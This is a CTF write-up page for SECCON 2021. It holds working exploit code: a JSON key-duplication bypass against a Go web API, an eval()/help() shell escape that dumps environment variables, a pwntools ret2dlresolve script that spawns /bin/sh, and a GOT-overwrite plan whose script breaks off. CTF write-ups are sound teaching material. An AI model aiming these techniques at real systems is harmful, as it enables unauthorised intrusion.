@@ -1,0 +1,479 @@
+<!DOCTYPE html><html data-astro-transition-scope="astro-nfpogox7-1" lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/regular/font.css"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/bold/font.css"><link rel="icon" href="/favicon.ico?v=2" sizes="16x16 32x32 48x48"><link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32.png?v=2"><link rel="icon" type="image/png" sizes="512x512" href="/icons/favicon.png?v=2"><link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png?v=2"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Aynakeya" href="/rss.xml"><link rel="canonical" href="https://www.aynakeya.com/ctf-writeup/2021/secconctf/seccon-2021-write-up/"><meta name="generator" content="Astro v7.3.3"><title>【Seccon CTF 2021】write up 【pwn】【web】【misc】 | Aynakeya</title><meta name="description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:type" content="website"><meta property="og:title" content="【Seccon CTF 2021】write up 【pwn】【web】【misc】 | Aynakeya"><meta property="og:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:url" content="https://www.aynakeya.com/ctf-writeup/2021/secconctf/seccon-2021-write-up/"><meta property="og:image" content="https://www.aynakeya.com/images/avatar.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="【Seccon CTF 2021】write up 【pwn】【web】【misc】 | Aynakeya"><meta name="twitter:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta name="twitter:image" content="https://www.aynakeya.com/images/avatar.jpg"><script>
+  (() => {
+    function applyTheme() {
+      const savedTheme = localStorage.getItem('theme');
+      const themePreference = savedTheme === 'light' || savedTheme === 'dark' ? savedTheme : 'system';
+      document.documentElement.dataset.themePreference = themePreference;
+      document.documentElement.dataset.theme = themePreference === 'system'
+        ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light')
+        : themePreference;
+    }
+    applyTheme();
+    document.addEventListener('astro:after-swap', applyTheme);
+  })();
+</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CYDbzu1r.js"></script><link rel="stylesheet" href="/_astro/BaseLayout.CjWOxd-i.css"><link rel="stylesheet" href="/_astro/katex.DM9nOOGm.css"><style>.ctf-year{margin-bottom:24px}.ctf-year-title{align-items:baseline;gap:18px;margin:0 0 14px;padding:14px 24px;font-size:23px;display:flex}.ctf-year-title span{color:var(--muted);font-size:13px;font-weight:400}.ctf-events{grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;display:grid}.ctf-event{flex-direction:column;justify-content:space-between;gap:20px;display:flex}.ctf-event h3{margin:0;font-size:19px}.ctf-event>div{color:var(--muted);justify-content:space-between;align-items:center;font-size:13px;display:flex}.ctf-event:hover{border-color:var(--accent)}.ctf-event:hover .icon{color:var(--accent)}.ctf-related h2{margin-bottom:16px;font-size:19px}.ctf-related>a{justify-content:space-between;gap:16px;padding:8px 0;font-size:15px;display:flex}.ctf-breadcrumbs,.ctf-meta{color:var(--muted);flex-wrap:wrap;align-items:center;gap:8px 14px;font-size:13px;display:flex}.ctf-breadcrumbs>span{color:var(--line)}.ctf-meta>a{color:var(--accent);margin-left:auto}.ctf-writeups,.ctf-back{max-width:1080px;margin:32px auto 0}.ctf-writeups>h2{align-items:center;gap:12px;font-size:23px;display:flex}.ctf-group{margin-top:24px}.ctf-group h3{color:var(--accent);background:var(--soft);border-radius:4px;margin:0;padding:8px 14px;font-size:14px}.ctf-group ul{margin:0;padding:0;list-style:none}.ctf-group a{border-bottom:1px solid var(--line);justify-content:space-between;align-items:center;gap:16px;padding:16px 14px;font-size:16px;display:flex}.ctf-group .icon{color:var(--muted)}.ctf-back{border-top:1px solid var(--line);color:var(--accent);padding-top:24px;font-size:14px}@media (width<=620px){.ctf-events{grid-template-columns:1fr}.ctf-event{gap:14px}.ctf-group a{padding-inline:0;font-size:15px}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: astro-nfpogox7-1; }@layer astro { ::view-transition-old(astro-nfpogox7-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-nfpogox7-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-nfpogox7-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }</style></head><body id="top"><a class="skip-link" href="#content">Skip to content</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Aynakeya home"><img src="/icons/favicon.png" alt="" width="32" height="32"><span>Aynakeya</span></a><nav class="site-nav" aria-label="Main navigation"><a href="/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m3 10 9-7 9 7M5 9v11h5v-6h4v6h5V9"></path></svg><span>Home</span></a><a href="/blog/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 4H5v16h14v-9M9 15l1-4L19 2l3 3-9 9-4 1Z"></path></svg><span>Writing</span></a><a href="/bookmarks/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 3h12v18l-6-4-6 4V3Z"></path></svg><span>Bookmarks</span></a><a href="/ctf-writeup/" aria-current="page"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3h18v5H3V3ZM5 8v13h14V8M10 12h4"></path></svg><span>CTF</span></a></nav><div class="header-tools"><a class="icon-button" href="/search/" aria-label="搜索文章与 CTF 归档" title="搜索文章与 CTF 归档"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 21l-5-5M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"></path></svg></a><button class="icon-button" id="theme-toggle" type="button" aria-label="当前：跟随系统；切换到浅色模式" title="当前：跟随系统；切换到浅色模式"><span data-theme-icon="light" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5M17 12a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"></path></svg></span><span data-theme-icon="dark" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.9 13A9 9 0 0 1 11 3.1 9 9 0 1 0 20.9 13Z"></path></svg></span><span data-theme-icon="system"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 4h18v13H3V4ZM12 17v4M8 21h8"></path></svg></span></button></div></div></header><script type="module">var e=document.documentElement,t=matchMedia(`(prefers-color-scheme: dark)`),n={light:{label:`浅色模式`,next:`dark`},dark:{label:`深色模式`,next:`system`},system:{label:`跟随系统`,next:`light`}};function r(){let r=e.dataset.themePreference;e.dataset.theme=r===`system`?t.matches?`dark`:`light`:r;let i=document.querySelector(`#theme-toggle`),a=i.querySelectorAll(`[data-theme-icon]`),o=n[r],s=`当前：${o.label}；切换到${n[o.next].label}`;i.setAttribute(`aria-label`,s),i.title=s,a.forEach(e=>{e.hidden=e.dataset.themeIcon!==r})}r(),document.addEventListener(`astro:after-swap`,r),document.addEventListener(`click`,t=>{if(!(t.target instanceof Element)||!t.target.closest(`#theme-toggle`))return;let i=n[e.dataset.themePreference].next;e.dataset.themePreference=i,localStorage.setItem(`theme`,i),r()}),t.addEventListener(`change`,()=>{e.dataset.themePreference===`system`&&r()});</script><div class="site-shell"><aside class="site-sidebar" aria-label="个人信息与文章目录"><section class="profile-card panel" aria-label="About Aynakeya"><a class="profile-avatar" href="/" aria-label="Aynakeya home"><img src="/images/avatar.jpg" alt="Aynakeya 的头像" width="208" height="208"></a><div class="profile-identity"><p class="profile-name">Aynakeya</p><p class="profile-interests">相信的心就是你的魔法</p><div class="social-links"><a href="https://github.com/aynakeya">GitHub</a><a href="mailto:aynakeya.official@gmail.com">Email</a><a href="https://space.bilibili.com/10003632">Bilibili</a></div></div><div class="site-stats"><a href="/blog/archives/"><strong>121</strong><span>文章</span></a><a href="/blog/categories/"><strong>16</strong><span>分类</span></a><a href="/blog/tags/"><strong>101</strong><span>标签</span></a></div></section><details class="toc" open><summary>文章目录</summary><nav aria-label="Table of contents"><ol><li style="--depth: 0"><a href="#0x0-introduction">0x0 Introduction</a></li><li style="--depth: 0"><a href="#0x1-web---vulnerabilities">0x1 Web - vulnerabilities</a></li><li style="--depth: 1"><a href="#basic-idea">basic idea</a></li><li style="--depth: 1"><a href="#vulnerable">vulnerable</a></li><li style="--depth: 1"><a href="#exppy">exp.py</a></li><li style="--depth: 1"><a href="#flag">flag</a></li><li style="--depth: 0"><a href="#0x2-misc---hitchhike">0x2 Misc - hitchhike</a></li><li style="--depth: 1"><a href="#tldr">tl;dr</a></li><li style="--depth: 1"><a href="#solution">solution</a></li><li style="--depth: 1"><a href="#flag-1">flag</a></li><li style="--depth: 0"><a href="#0x3-pwn---kasu_bof">0x3 Pwn - kasu_bof</a></li><li style="--depth: 1"><a href="#tldr-1">tl;dr</a></li><li style="--depth: 1"><a href="#exppy-1">exp.py</a></li><li style="--depth: 1"><a href="#flag-2">flag</a></li><li style="--depth: 0"><a href="#0x4-pwn---average">0x4 pwn - average</a></li><li style="--depth: 1"><a href="#solution-1">solution</a></li><li style="--depth: 1"><a href="#exppy-2">exp.py</a></li><li style="--depth: 1"><a href="#flag-3">flag</a></li></ol></nav></details><script type="module">var e=matchMedia(`(max-width: 800px)`);function t(){let t=document.querySelector(`.toc`);t&&(t.open=!e.matches)}t(),document.addEventListener(`astro:after-swap`,t),e.addEventListener(`change`,t);</script></aside><div class="site-main"><main id="content" tabindex="-1"><article class="paper article-page ctf-page"><header class="post-header"><nav class="ctf-breadcrumbs" aria-label="Breadcrumb"><a href="/ctf-writeup/">CTF Archive</a><span>/</span><a href="/ctf-writeup/#2021">2021</a><span>/</span><a href="/ctf-writeup/2021/secconctf/">Seccon CTF 2021</a></nav><h1>【Seccon CTF 2021】write up 【pwn】【web】【misc】</h1><div class="ctf-meta"><span class="heading-count">历史归档</span><span>Writeups</span><a href="https://github.com/aynakeya/ctf-writeup/tree/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2021/secconctf">GitHub 附件 <svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14m-6-6 6 6-6 6"></path></svg></a></div></header><div class="prose"><p><a id="0x0-Introduction"></a></p>
+<h1 id="0x0-introduction">0x0 Introduction</h1>
+<p>I participate seccon 2021 yesterday.</p>
+<ul>
+<li><a href="#0x1-Web-vulnerabilities">web-vulnerabilities</a></li>
+<li><a href="#0x2-Misc-hitchhike">misc-hitchhike</a></li>
+<li><a href="#0x3-Pwn-kasu-bof">pwn-kasu_bof</a></li>
+<li><a href="#0x4-pwn-average">pwn-average</a></li>
+</ul>
+<p><a id="0x1-Web-vulnerabilities"></a></p>
+<h1 id="0x1-web---vulnerabilities">0x1 Web - vulnerabilities</h1>
+<h2 id="basic-idea">basic idea</h2>
+<p>The program is a web service written in golang. The flag is stored in a in-memory sqlite database.</p>
+<p>The data structure of table is called <strong>Vulnerability</strong><img alt="2021-12-12_144720.jpg" loading="lazy" decoding="async" width="427" height="186" src="/_astro/2021-12-12_144720.C8JUopYv_1Gml5w.webp"></p>
+<p>the flag is stored at the last row of the sqlite table.<img alt="2021-12-12_144910.jpg" loading="lazy" decoding="async" width="1491" height="452" src="/_astro/2021-12-12_144910.D9DS2T6I_Z1udalg.webp"></p>
+<h2 id="vulnerable">vulnerable</h2>
+<p>the vulnerable is locate at the post method of api</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>	r.POST("/api/vulnerability", func(c *gin.Context) {</span></span>
+<span class="line"><span>		//	Validate the parameter</span></span>
+<span class="line"><span>		var json map[string]interface{}</span></span>
+<span class="line"><span>		if err := c.ShouldBindBodyWith(&#x26;json, binding.JSON); err != nil {</span></span>
+<span class="line"><span>			c.JSON(400, gin.H{"Error": "JSON error 1"})</span></span>
+<span class="line"><span>			return</span></span>
+<span class="line"><span>		}</span></span>
+<span class="line"><span>		if name, ok := json["Name"]; !ok || name == "" || name == nil {</span></span>
+<span class="line"><span>			c.JSON(400, gin.H{"Error": "no \"Name\""})</span></span>
+<span class="line"><span>			return</span></span>
+<span class="line"><span>		}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>		//	Get details of the vulnerability</span></span>
+<span class="line"><span>		var query Vulnerability</span></span>
+<span class="line"><span>		if err := c.ShouldBindBodyWith(&#x26;query, binding.JSON); err != nil {</span></span>
+<span class="line"><span>			c.JSON(400, gin.H{"Error": "JSON error 2"})</span></span>
+<span class="line"><span>			return</span></span>
+<span class="line"><span>		}</span></span>
+<span class="line"><span>		var vuln Vulnerability</span></span>
+<span class="line"><span>		if err := db.Where(&#x26;query).First(&#x26;vuln).Error; err != nil {</span></span>
+<span class="line"><span>			c.JSON(404, gin.H{"Error": "not found"})</span></span>
+<span class="line"><span>			return</span></span>
+<span class="line"><span>		}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>		c.JSON(200, gin.H{</span></span>
+<span class="line"><span>			"Logo": vuln.Logo,</span></span>
+<span class="line"><span>			"URL":  vuln.URL,</span></span>
+<span class="line"><span>		})</span></span>
+<span class="line"><span>	})</span></span></code></pre>
+<p>if we want to query the flag by the <strong>Vulnerability</strong> struct, the only way is query the flag by its' ID (in this case flag have id 14), as defined in the <strong>gorm.Model</strong>
+<img alt="2021-12-12_145338.jpg" loading="lazy" decoding="async" width="1166" height="428" src="/_astro/2021-12-12_145338.r7I3cUcI_vPzAH.webp"></p>
+<p>And every other field in the struct should be zero values ("",0 ...),  Therefore, we need to find a way to let <code>json["Name"]!=""</code> and <code>vuln.Name == ""</code></p>
+<p>Since <em>json</em> is a <strong>map[string]interface{}</strong>, which means it is case sensitive, <code>"Name"</code> and <code>"name"</code> are two different thing. But how golang struct, when unmarshal, <code>"Name"</code> and <code>"name"</code> are considered as same key, also the second value will overwrite first value.</p>
+<p><a id="exp-py"></a></p>
+<h2 id="exppy">exp.py</h2>
+<p>Make "Name" = "Heartbleed" two bypass first check, than use "name" = "" to overwrite <code>vuln.Name</code>. Use "ID" = 14 to query the flag</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>import requests</span></span>
+<span class="line"><span>url = "https://vulnerabilities.quals.seccon.jp/api/vulnerability"</span></span>
+<span class="line"><span>payload="{\"Name\":\"Heartbleed\",\"name\":\"\",\"ID\":14}"</span></span>
+<span class="line"><span>response = requests.post(url, data=payload)</span></span>
+<span class="line"><span>print(response.text)</span></span>
+<span class="line"><span></span></span></code></pre>
+<h2 id="flag">flag</h2>
+<p>SECCON{LE4RNING_FR0M_7HE_PA5T_FINDIN6_N0TABLE_VULNERABILITIE5}</p>
+<p><a id="0x2-Misc-hitchhike"></a></p>
+<h1 id="0x2-misc---hitchhike">0x2 Misc - hitchhike</h1>
+<p><strong>Everything is 42</strong></p>
+<p><a id="tl-dr"></a></p>
+<h2 id="tldr">tl;dr</h2>
+<p>the server.py.</p>
+<p><img alt="2021-12-12_150212.jpg" loading="lazy" decoding="async" width="921" height="772" src="/_astro/2021-12-12_150212.BjXzL78x_1DC067.webp"></p>
+<h2 id="solution">solution</h2>
+<p>The first 4 element can convert to 42 by a general solution <code>"0 or 42"</code></p>
+<p>It is impossible to find a string v that makes <code>eval(f'{{b'6':6666}} * {v}', {}, {}) == 42</code>, because dict can't multiply with any other thing.</p>
+<p>but sinces it use eval, we can get a simple shell using <code>help()</code></p>
+<ol>
+<li>enter help()</li>
+<li>enter os</li>
+<li>since the flag is in the environment variable, use !env to get the flag</li>
+</ol>
+<p><img alt="2021-12-12_150834.jpg" loading="lazy" decoding="async" width="1073" height="184" src="/_astro/2021-12-12_150834.BwSG-osW_ZGphfI.webp"><img alt="2021-12-12_150918.jpg" loading="lazy" decoding="async" width="787" height="423" src="/_astro/2021-12-12_150918.CZoQKScV_244Btj.webp"></p>
+<h2 id="flag-1">flag</h2>
+<p>SECCON{1_b3li3v3_th1s_1s_th3_sh0rt3st_Pyth0n_c0d3_2_g3t_SH3LL}</p>
+<p><a id="0x3-Pwn-kasu-bof"></a></p>
+<h1 id="0x3-pwn---kasu_bof">0x3 Pwn - kasu_bof</h1>
+<p><a id="tl-dr-1"></a></p>
+<h2 id="tldr-1">tl;dr</h2>
+<p>return to dl resolve. just refer to my article <a href="/blog/posts/ret2-dl-resolve-example-silent-rop/">ret2-dl-resolve-example-silent-rop</a></p>
+<p><a id="exp-py-1"></a></p>
+<h2 id="exppy-1">exp.py</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>class BinaryInfo:</span></span>
+<span class="line"><span>    exe = "chall"</span></span>
+<span class="line"><span>    libc = ""</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    host = "hiyoko.quals.seccon.jp"</span></span>
+<span class="line"><span>    port = 9001</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF(BinaryInfo.exe)</span></span>
+<span class="line"><span>exe_rop = ROP(exe)</span></span>
+<span class="line"><span>if BinaryInfo.libc != "":</span></span>
+<span class="line"><span>    libc = ELF(BinaryInfo.libc)</span></span>
+<span class="line"><span>    libc_rop = ROP(libc)</span></span>
+<span class="line"><span>else:</span></span>
+<span class="line"><span>    libc = None</span></span>
+<span class="line"><span>    libc_rop = None</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or BinaryInfo.host</span></span>
+<span class="line"><span>port = int(args.PORT or BinaryInfo.port)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = connect(host, port)</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span># Arch:     i386-32-little</span></span>
+<span class="line"><span># RELRO:    Partial RELRO</span></span>
+<span class="line"><span># Stack:    No canary found</span></span>
+<span class="line"><span># NX:       NX enabled</span></span>
+<span class="line"><span># PIE:      No PIE (0x8048000)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def log_print(*msg):</span></span>
+<span class="line"><span>    log.info(" ".join(msg))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def int2byte(x: int):</span></span>
+<span class="line"><span>    return x.to_bytes(0x4, "little")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def wait_for_debugger(io):</span></span>
+<span class="line"><span>    if args.LOCAL and input("debugger?") == "y\n":</span></span>
+<span class="line"><span>        pid = util.proc.pidof(io)[0]</span></span>
+<span class="line"><span>        log_print("The pid is: " + str(pid))</span></span>
+<span class="line"><span>        util.proc.wait_for_debugger(pid)</span></span>
+<span class="line"><span>        log_print("press enter to continue")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># binary info goes here</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>writable_addr = 0x0804d000-0x200</span></span>
+<span class="line"><span>buffer_over_flow_offset = 0x80</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span>wait_for_debugger(io)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"], data_addr=writable_addr)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>exe_rop.call('gets', [dlresolve.data_addr])</span></span>
+<span class="line"><span>#exe_rop.call('read', [0,dlresolve.data_addr,200]) # read(0,data_addr,length)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>exe_rop.ret2dlresolve(dlresolve)</span></span>
+<span class="line"><span>raw_rop = exe_rop.chain()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print("Create fake call stack rop")</span></span>
+<span class="line"><span>log_print(exe_rop.dump())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># You may have to remove the ret before the rop, it depends on the machine.</span></span>
+<span class="line"><span># align stack</span></span>
+<span class="line"><span>ret_addr = exe_rop.find_gadget(['ret'])[0]</span></span>
+<span class="line"><span># buffer_over_flow_offset + rbp/ebp length</span></span>
+<span class="line"><span>io.sendline(fit({buffer_over_flow_offset+exe.bytes:  int2byte(ret_addr) + raw_rop}))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print(f'Sending dlresolve payload at address {hex(dlresolve.data_addr)}:\n{hexdump(dlresolve.payload)}')</span></span>
+<span class="line"><span>io.sendline(dlresolve.payload)</span></span>
+<span class="line"><span>log_print("Get shell")</span></span>
+<span class="line"><span>io.interactive()</span></span></code></pre>
+<h2 id="flag-2">flag</h2>
+<p>SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}</p>
+<p><a id="0x4-pwn-average"></a></p>
+<h1 id="0x4-pwn---average">0x4 pwn - average</h1>
+<h2 id="solution-1">solution</h2>
+<p>The leak here is the program can accept number larger than 16, which give me the chance to overwrite the stack by integer value. Since the list <code>A[16]</code> only have length 16.</p>
+<p>However, there is a restriction that the input value can only be in the range of -123456789 - 123456789, so if we want to enter a number in the libc function, the system will call sys.exit()</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span> if (A[i]&#x3C;-123456789LL || 123456789LL&#x3C;A[i])</span></span>
+<span class="line"><span>        {</span></span>
+<span class="line"><span>            printf("too large\n");</span></span>
+<span class="line"><span>            exit(0);</span></span>
+<span class="line"><span>        }</span></span></code></pre>
+<p>But, since it is Patial RERLO, we can change the address in the <code>got.exit</code></p>
+<p>Steps</p>
+<ol>
+<li>call printf(got.printf) to get the leak of libc</li>
+<li>overwrite got.exit</li>
+<li>cal system("/bin/sh")</li>
+</ol>
+<p><a id="exp-py-2"></a></p>
+<h2 id="exppy-2">exp.py</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>class BinaryInfo:</span></span>
+<span class="line"><span>    exe = "average"</span></span>
+<span class="line"><span>    libc = "libc.so.6"</span></span>
+<span class="line"><span>    # libc = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    host = "average.quals.seccon.jp"</span></span>
+<span class="line"><span>    port = 1234</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if args.LOCAL:</span></span>
+<span class="line"><span>    BinaryInfo.libc = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF(BinaryInfo.exe)</span></span>
+<span class="line"><span>exe_rop = ROP(exe)</span></span>
+<span class="line"><span>if BinaryInfo.libc != "":</span></span>
+<span class="line"><span>    libc = ELF(BinaryInfo.libc)</span></span>
+<span class="line"><span>    libc_rop = ROP(libc)</span></span>
+<span class="line"><span>else:</span></span>
+<span class="line"><span>    libc = None</span></span>
+<span class="line"><span>    libc_rop = None</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or BinaryInfo.host</span></span>
+<span class="line"><span>port = int(args.PORT or BinaryInfo.port)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = connect(host, port)</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span># Arch:     Rua</span></span>
+<span class="line"><span># RELRO:    Rua</span></span>
+<span class="line"><span># Stack:    Rua</span></span>
+<span class="line"><span># NX:       Rua</span></span>
+<span class="line"><span># PIE:      Rua</span></span>
